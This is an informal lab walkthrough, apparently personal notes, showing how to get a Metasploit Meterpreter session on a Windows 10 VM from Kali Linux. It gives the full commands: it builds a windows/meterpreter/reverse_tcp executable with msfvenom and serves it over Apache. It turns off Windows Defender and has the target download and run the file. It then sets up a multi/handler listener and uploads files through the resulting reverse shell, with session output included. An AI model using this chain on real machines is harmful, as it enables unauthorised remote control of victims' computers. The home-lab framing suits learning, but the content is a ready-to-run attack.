## shortcut on creating simple meterpreter session for fun##

##launch terminal##
# escalate to root #
~$ sudo su

# run the following to create msfvenom reverse shell payload *.exe and place it into your webserver directory #
┌──(root💀kali )-[/g]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > /var/www/html/fun.exe  


# the wares have been created run the following to start the appache webserver(or simple python server)#
┌──(root💀kali )-[/g]
└─# service apache2 start


##### Go to Windows machine ######

### Turn off Windows defender ##

 # Launch browser in windows. download and run executable msfvenom created #
open http://kaliipaddress/fun.exe 

# windows target is ready for expoiting and post exploitation ##

# Launch metasploit #

┌──(root💀kali)-[/g]
└─# msfconsole  


## run the following in metasploit, throw in an options or help command here and there ##

msf6 > use multi/handler

[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0

msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Sending stage (175174 bytes) to <windowsip>
[*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.3:2352 ) at 2022-02-28 00:55:06 -0500

# meterpreter session spawned # 

meterpreter > sysinfo <br>
 
Computer        : DESKTOP-WINDERS10 <br>
OS              : Windows 10 (10.0 Build 19044). <br>
Architecture    : x64 <br>
System Language : en_US <br>
Domain          : WORKGROUP <br>
Logged On Users : 2
Meterpreter     : x86/windows<br>

# open another terminal create a readme.txt to upload to windows computer in meterpreter #<br>
<br>
┌──(root💀kali)-[/g]
└─# nano readme.txt  <-- paste in the msfbanner that launched at the beginning, (I used a cow and ninja)
<br>
# Go back to meterpreter #
<br>
> meterpreter > upload readme.txt<br>
[*] uploading  : /g/readme.txt -> readme.txt<br>
[*] Uploaded 1.39 KiB of 1.39 KiB (100.0%): /g/readme.txt -> readme.txt<br>
[*] uploaded   : /g/readme.txt -> readme.txt<br>
meterpreter > ls<br>
> Listing: C:\Users\Gregster\Downloads<br>

## vefify that the file is there list and then look at it in windows machine, change directories in meterpreter, stop apache2 ... #<br>
<br>
┌──(root💀kali)-[/g]
└─# systemctl stop apache2  
<br>
┌──(root💀kali)-[/g]
└─# nmap -p80 localhost          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 01:40 EST<br>
Nmap scan report for localhost (127.0.0.1)<br>
Host is up (0.000086s latency).<br>
Other addresses for localhost (not scanned): ::1<br>

PORT   STATE  SERVICE<br>
80/tcp closed http<br>

# meterpreter<br>
Metasploit/Meterpreter session from Kali to Windows VM<br>
